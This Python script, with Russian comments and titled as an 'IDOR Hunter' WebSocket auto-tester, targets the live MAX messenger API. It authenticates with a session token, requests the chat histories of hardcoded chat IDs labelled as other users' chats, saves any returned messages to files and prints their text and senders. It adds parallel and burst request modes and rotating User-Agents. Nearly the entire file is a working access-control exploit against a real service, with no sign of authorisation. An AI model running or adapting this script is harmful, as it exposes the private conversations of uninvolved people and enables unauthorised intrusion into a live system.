#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     LAINMODEMAXGOD - WebSocket Auto-Tester                   ║
║                         for MAX (ws-api.oneme.ru)                            ║
║                                   v2.0                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

Автор: lainmode

"""

import websocket
import json
import time
import ssl
import sys
import os
from datetime import datetime
from typing import Dict, Any, Optional, List
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==============================================================================
# НАСТРОЙКИ
# ==============================================================================

# Конфигурация подключения
WEBSOCKET_URL = "wss://ws-api.oneme.ru/websocket"
PROXY = ""  # Оставьте пустым если без прокси, или укажите "http://127.0.0.1:8080" для Burp

# ТВОЙ ТОКЕН (скопирован из успешного запроса в браузере)
TOKEN = "ваш токен"

# ID для тестирования (из твоего ответа сервера)
TARGET_CHAT_IDS = [
    260361296,  # Чужой чат с пользователем 146874870
    227186508,  # Чат с пользователем 181369578
    224502236,  # Чат с пользователем 170151034
    223115928,  # Чат с пользователем 168400702
    122528253,  # Системный чат
]

# Дополнительные ID для массового тестирования (раскомментируй если нужно)
# TARGET_CHAT_IDS.extend([12345, 67890, 111213, 141516, 171819])

# User-Agent строки для тестирования
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

# Настройки задержек (в секундах)
DELAY_BETWEEN_TESTS = 2
DELAY_AFTER_INIT = 0.5
DELAY_BETWEEN_REQUESTS = 0.3

# ==============================================================================
# КЛАССЫ ДЛЯ ЦВЕТНОГО ВЫВОДА
# ==============================================================================

class Colors:
    """Цвета для красивого вывода в терминал"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    @staticmethod
    def success(text):
        return f"{Colors.GREEN}✓ {text}{Colors.END}"
    
    @staticmethod
    def error(text):
        return f"{Colors.RED}✗ {text}{Colors.END}"
    
    @staticmethod
    def warning(text):
        return f"{Colors.YELLOW}⚠ {text}{Colors.END}"
    
    @staticmethod
    def info(text):
        return f"{Colors.BLUE}ℹ {text}{Colors.END}"
    
    @staticmethod
    def highlight(text):
        return f"{Colors.BOLD}{Colors.CYAN}{text}{Colors.END}"
    
    @staticmethod
    def critical(text):
        return f"{Colors.BOLD}{Colors.RED}🚨 {text}{Colors.END}"

# ==============================================================================
# ОСНОВНЫЕ ФУНКЦИИ
# ==============================================================================

def print_banner():
    """Выводит красивый баннер при запуске"""
    banner = f"""
{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                     ║
║     {Colors.BOLD}██╗      █████╗ ██╗███╗   ██╗███╗   ███╗ ██████╗ ██████╗ ███████╗{Colors.CYAN}     ║
║     {Colors.BOLD}██║     ██╔══██╗██║████╗  ██║████╗ ████║██╔═══██╗██╔══██╗██╔════╝{Colors.CYAN}     ║
║     {Colors.BOLD}██║     ███████║██║██╔██╗ ██║██╔████╔██║██║   ██║██║  ██║█████╗  {Colors.CYAN}     ║
║     {Colors.BOLD}██║     ██╔══██║██║██║╚██╗██║██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  {Colors.CYAN}     ║
║     {Colors.BOLD}███████╗██║  ██║██║██║ ╚████║██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗{Colors.CYAN}     ║
║     {Colors.BOLD}╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝{Colors.CYAN}     ║
║                                                                                                     ║
║              {Colors.YELLOW}WebSocket Auto-Tester for MAX{Colors.CYAN}                              ║
║                 {Colors.BOLD}v2.0 - IDOR Hunter{Colors.CYAN}                                        ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)
    print(f"{Colors.info(f'Время запуска: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')}")
    print(f"{Colors.info(f'Целей для тестирования: {len(TARGET_CHAT_IDS)}')}")
    print(f"{Colors.info(f'Токен: {TOKEN[:30]}...')}")
    print("=" * 70)

def create_connection(user_agent: str = USER_AGENTS[0]) -> Optional[websocket.WebSocket]:
    """
    Создает WebSocket соединение с сервером
    
    Args:
        user_agent: User-Agent строка для заголовка
        
    Returns:
        WebSocket объект или None при ошибке
    """
    headers = {
        "User-Agent": user_agent,
        "Origin": "https://web.max.ru",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    
    try:
        ws = websocket.WebSocket()
        
        # Настройка прокси если указан
        if PROXY:
            from urllib.parse import urlparse
            p = urlparse(PROXY)
            ws.connect(WEBSOCKET_URL, 
                      http_proxy_host=p.hostname,
                      http_proxy_port=p.port,
                      header=headers,
                      sslopt={"cert_reqs": ssl.CERT_NONE})
            print(f"{Colors.info(f'Подключение через прокси {p.hostname}:{p.port}')}")
        else:
            ws.connect(WEBSOCKET_URL, 
                      header=headers,
                      sslopt={"cert_reqs": ssl.CERT_NONE})
        
        return ws
    except Exception as e:
        print(f"{Colors.error(f'Ошибка подключения: {e}')}")
        return None

def send_message(ws: websocket.WebSocket, opcode: int, seq: int, payload: Dict, 
                 description: str = "") -> Optional[Dict]:
    """
    Отправляет сообщение через WebSocket и получает ответ
    
    Args:
        ws: WebSocket соединение
        opcode: Код операции
        seq: Номер последовательности
        payload: Данные для отправки
        description: Описание для вывода
        
    Returns:
        Ответ сервера в виде словаря или None при ошибке
    """
    message = {
        "ver": 11,
        "cmd": 0,
        "seq": seq,
        "opcode": opcode,
        "payload": payload
    }
    
    try:
        msg_str = json.dumps(message, ensure_ascii=False)
        if description:
            print(f"  {Colors.info(f'→ [{description}]')} Отправка ({len(msg_str)} байт)")
        
        ws.send(msg_str)
        response = ws.recv()
        
        if description:
            print(f"  {Colors.info(f'← [{description}]')} Получено ({len(response)} байт)")
        
        return json.loads(response)
    except Exception as e:
        print(f"  {Colors.error(f'Ошибка: {e}')}")
        return None

def analyze_init_response(response: Dict) -> bool:
    """
    Анализирует ответ на инициализацию
    
    Args:
        response: Ответ сервера
        
    Returns:
        True если инициализация успешна, иначе False
    """
    if not response:
        return False
    
    if "payload" in response:
        payload = response["payload"]
        
        if "error" in payload:
            error = payload["error"]
            message = payload.get("message", "")
            print(f"  {Colors.warning(f'Ошибка: {error} - {message}')}")
            return False
        
        # Проверяем наличие данных профиля
        if "profile" in payload or "chats" in payload:
            print(f"  {Colors.success('Инициализация успешна')}")
            return True
    
    return False

def analyze_chat_response(response: Dict, chat_id: int) -> bool:
    """
    Анализирует ответ с историей чата
    
    Args:
        response: Ответ сервера
        chat_id: ID проверяемого чата
        
    Returns:
        True если найдена история, иначе False
    """
    if not response:
        return False
    
    if "payload" in response:
        payload = response["payload"]
        
        if "error" in payload:
            error = payload["error"]
            if error == "access denied":
                print(f"  {Colors.warning(f'Доступ запрещен к chatId={chat_id}')}")
            else:
                print(f"  {Colors.warning(f'Ошибка: {error}')}")
            return False
        
        if "history" in payload:
            history = payload.get("history", [])
            if history:
                print(f"\n  {Colors.critical(f'НАЙДЕНА ИСТОРИЯ для chatId={chat_id}!')}")
                print(f"  {Colors.info(f'Количество записей: {len(history)}')}")
                
                # Сохраняем результат
                filename = f"IDOR_CHAT_{chat_id}_{int(time.time())}.json"
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump(response, f, indent=2, ensure_ascii=False)
                print(f"  {Colors.success(f'Сохранено в {filename}')}")
                
                # Показываем первые несколько сообщений
                for i, item in enumerate(history[:3]):
                    msg = item.get("message", {})
                    text = msg.get("text", "")[:50]
                    sender = msg.get("sender", "unknown")
                    print(f"    [{i}] От: {sender}, Текст: {text}")
                
                return True
            else:
                print(f"  {Colors.info(f'История пуста для chatId={chat_id}')}")
                return False
    
    return False

def test_single_chat(chat_id: int, user_agent: str = USER_AGENTS[0]) -> bool:
    """
    Тестирует один chatId на наличие доступа
    
    Args:
        chat_id: ID чата для тестирования
        user_agent: User-Agent для запроса
        
    Returns:
        True если тест прошел успешно (не обязательно найден IDOR)
    """
    print(f"\n{Colors.highlight('─' * 50)}")
    print(f"{Colors.BOLD}Тестирование chatId: {Colors.YELLOW}{chat_id}{Colors.END}")
    print(f"{Colors.highlight('─' * 50)}")
    
    # Создаем соединение
    ws = create_connection(user_agent)
    if not ws:
        return False
    
    try:
        # Инициализация с полным payload как в браузере
        init_payload = {
            "interactive": True,
            "token": TOKEN,
            "chatsCount": 40,
            "lastLogin": 1771808126382,
            "chatsSync": 1771791654135,
            "contactsSync": 1771593844275,
            "presenceSync": -1,
            "draftsSync": 0,
            "configHash": "3af0b539-0000000000000000-80000000-0000000000000001-0000000000000000-2-0000000000000000-e70f2574"
        }
        
        init_response = send_message(ws, 19, 1, init_payload, "init")
        if not analyze_init_response(init_response):
            ws.close()
            return False
        
        # Небольшая пауза как в реальном приложении
        time.sleep(DELAY_AFTER_INIT)
        
        # Запрос истории чата
        chat_payload = {
            "chatIds": [chat_id]
        }
        
        chat_response = send_message(ws, 79, 2, chat_payload, f"chat_{chat_id}")
        if chat_response:
            analyze_chat_response(chat_response, chat_id)
        
        ws.close()
        return True
        
    except Exception as e:
        print(f"{Colors.error(f'Ошибка в тесте: {e}')}")
        try:
            ws.close()
        except:
            pass
        return False

def test_multiple_chats_sequential():
    """Последовательное тестирование нескольких chatId"""
    print(f"\n{Colors.BOLD}{Colors.HEADER}🔍 ПОСЛЕДОВАТЕЛЬНОЕ ТЕСТИРОВАНИЕ{Colors.END}")
    print(f"{Colors.highlight('=' * 70)}")
    
    successful = 0
    found_idor = 0
    
    for idx, chat_id in enumerate(TARGET_CHAT_IDS, 1):
        print(f"\n{Colors.BOLD}[{idx}/{len(TARGET_CHAT_IDS)}]{Colors.END}")
        
        # Чередуем User-Agent для разнообразия
        user_agent = USER_AGENTS[idx % len(USER_AGENTS)]
        
        if test_single_chat(chat_id, user_agent):
            successful += 1
        
        # Пауза между тестами
        if idx < len(TARGET_CHAT_IDS):
            print(f"\n{Colors.info(f'Ожидание {DELAY_BETWEEN_TESTS} сек...')}")
            time.sleep(DELAY_BETWEEN_TESTS)
    
    print(f"\n{Colors.highlight('=' * 70)}")
    print(f"{Colors.BOLD}РЕЗУЛЬТАТЫ ПОСЛЕДОВАТЕЛЬНОГО ТЕСТИРОВАНИЯ:{Colors.END}")
    print(f"  {Colors.success(f'Успешных тестов: {successful}/{len(TARGET_CHAT_IDS)}')}")
    print(f"  {Colors.critical(f'Найдено IDOR: {found_idor}')}")

def test_multiple_chats_parallel(max_workers: int = 3):
    """Параллельное тестирование нескольких chatId"""
    print(f"\n{Colors.BOLD}{Colors.HEADER}⚡ ПАРАЛЛЕЛЬНОЕ ТЕСТИРОВАНИЕ (макс. {max_workers} потоков){Colors.END}")
    print(f"{Colors.highlight('=' * 70)}")
    
    def worker(chat_id):
        user_agent = USER_AGENTS[hash(str(chat_id)) % len(USER_AGENTS)]
        result = test_single_chat(chat_id, user_agent)
        return chat_id, result
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker, chat_id) for chat_id in TARGET_CHAT_IDS]
        
        for future in as_completed(futures):
            try:
                chat_id, result = future.result(timeout=10)
                if result:
                    print(f"{Colors.success(f'✓ Тест {chat_id} завершен')}")
            except Exception as e:
                print(f"{Colors.error(f'✗ Ошибка в параллельном тесте: {e}')}")

def test_burst_mode():
    """Burst режим - все запросы в одном соединении"""
    print(f"\n{Colors.BOLD}{Colors.HEADER}🚀 BURST РЕЖИМ{Colors.END}")
    print(f"{Colors.highlight('=' * 70)}")
    
    # Создаем одно соединение для всех тестов
    ws = create_connection()
    if not ws:
        return
    
    try:
        # Инициализация
        init_payload = {
            "interactive": True,
            "token": TOKEN,
            "chatsCount": 40,
            "lastLogin": 1771808126382,
            "chatsSync": 1771791654135,
            "contactsSync": 1771593844275,
            "presenceSync": -1,
            "draftsSync": 0,
            "configHash": "3af0b539-0000000000000000-80000000-0000000000000001-0000000000000000-2-0000000000000000-e70f2574"
        }
        
        init_response = send_message(ws, 19, 1, init_payload, "init")
        if not analyze_init_response(init_response):
            ws.close()
            return
        
        # Отправляем все запросы подряд
        print(f"\n{Colors.BOLD}Отправка запросов:{Colors.END}")
        for idx, chat_id in enumerate(TARGET_CHAT_IDS, 1):
            chat_payload = {"chatIds": [chat_id]}
            send_message(ws, 79, idx + 1, chat_payload, f"burst_{idx}")
            # Минимальная задержка между отправками
            time.sleep(0.1)
        
        # Получаем ответы
        print(f"\n{Colors.BOLD}Получение ответов:{Colors.END}")
        for idx, chat_id in enumerate(TARGET_CHAT_IDS, 1):
            try:
                response = ws.recv()
                response_data = json.loads(response)
                analyze_chat_response(response_data, chat_id)
            except Exception as e:
                print(f"{Colors.error(f'Ошибка получения ответа для {chat_id}: {e}')}")
                break
        
        ws.close()
        
    except Exception as e:
        print(f"{Colors.error(f'Ошибка в burst режиме: {e}')}")
        try:
            ws.close()
        except:
            pass

def test_with_different_user_agents():
    """Тестирование с разными User-Agent"""
    print(f"\n{Colors.BOLD}{Colors.HEADER}🌐 ТЕСТИРОВАНИЕ USER-AGENT{Colors.END}")
    print(f"{Colors.highlight('=' * 70)}")
    
    test_chat = TARGET_CHAT_IDS[0]  # Берем первый chatId для теста
    
    for idx, ua in enumerate(USER_AGENTS, 1):
        print(f"\n{Colors.BOLD}[{idx}/{len(USER_AGENTS)}] User-Agent:{Colors.END}")
        print(f"  {ua[:80]}...")
        
        test_single_chat(test_chat, ua)
        
        if idx < len(USER_AGENTS):
            time.sleep(DELAY_BETWEEN_TESTS)

def save_results_summary():
    """Сохраняет сводку результатов тестирования"""
    summary = {
        "timestamp": datetime.now().isoformat(),
        "target_url": WEBSOCKET_URL,
        "tested_chats": TARGET_CHAT_IDS,
        "total_tests": len(TARGET_CHAT_IDS),
        "findings": []
    }
    
    # Ищем сохраненные файлы с результатами
    for file in os.listdir("."):
        if file.startswith("IDOR_CHAT_") and file.endswith(".json"):
            try:
                parts = file.replace("IDOR_CHAT_", "").replace(".json", "").split("_")
                chat_id = int(parts[0])
                summary["findings"].append({
                    "chat_id": chat_id,
                    "file": file,
                    "timestamp": int(parts[1]) if len(parts) > 1 else None
                })
            except:
                pass
    
    # Сохраняем сводку
    summary_file = f"IDOR_SUMMARY_{int(time.time())}.json"
    with open(summary_file, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    
    if summary["findings"]:
        print(f"\n{Colors.critical(f'НАЙДЕНО IDOR: {len(summary["findings"])}')}")
        for finding in summary["findings"]:
            print(f"  • chatId: {finding['chat_id']} -> {finding['file']}")
        print(f"\n{Colors.success(f'Сводка сохранена в {summary_file}')}")
    else:
        print(f"\n{Colors.info('IDOR уязвимостей не найдено')}")
        print(f"{Colors.success(f'Сводка сохранена в {summary_file}')}")

# ГЛАВНАЯ ФУНКЦИЯ

def main():
    """Главная функция программы"""
    print_banner()
    
    # Создаем папку для результатов если её нет
    if not os.path.exists("results"):
        os.makedirs("results")
    os.chdir("results")
    
    # Меню выбора режима
    print(f"\n{Colors.BOLD}Выберите режим тестирования:{Colors.END}")
    print(f"  {Colors.BOLD}[1]{Colors.END} Последовательное тестирование всех chatId")
    print(f"  {Colors.BOLD}[2]{Colors.END} Параллельное тестирование (быстро)")
    print(f"  {Colors.BOLD}[3]{Colors.END} Burst режим (все в одном соединении)")
    print(f"  {Colors.BOLD}[4]{Colors.END} Тестирование разных User-Agent")
    print(f"  {Colors.BOLD}[5]{Colors.END} Все режимы подряд")
    print(f"  {Colors.BOLD}[0]{Colors.END} Выход")
    
    choice = input(f"\n{Colors.BOLD}Ваш выбор [1-5]: {Colors.END}").strip()
    
    start_time = time.time()
    
    if choice == "1":
        test_multiple_chats_sequential()
    elif choice == "2":
        test_multiple_chats_parallel()
    elif choice == "3":
        test_burst_mode()
    elif choice == "4":
        test_with_different_user_agents()
    elif choice == "5":
        test_with_different_user_agents()
        time.sleep(3)
        test_burst_mode()
        time.sleep(3)
        test_multiple_chats_parallel()
        time.sleep(3)
        test_multiple_chats_sequential()
    else:
        print(f"{Colors.warning('Тестирование отменено')}")
        return
    
    # Сохраняем результаты
    save_results_summary()
    
    elapsed_time = time.time() - start_time
    print(f"\n{Colors.highlight('=' * 70)}")
    print(f"{Colors.success(f'✅ Тестирование завершено за {elapsed_time:.2f} секунд')}")
    print(f"{Colors.info('Результаты сохранены в папке results/')}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.warning('Тестирование прервано пользователем')}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.error(f'Критическая ошибка: {e}')}")
        sys.exit(1)
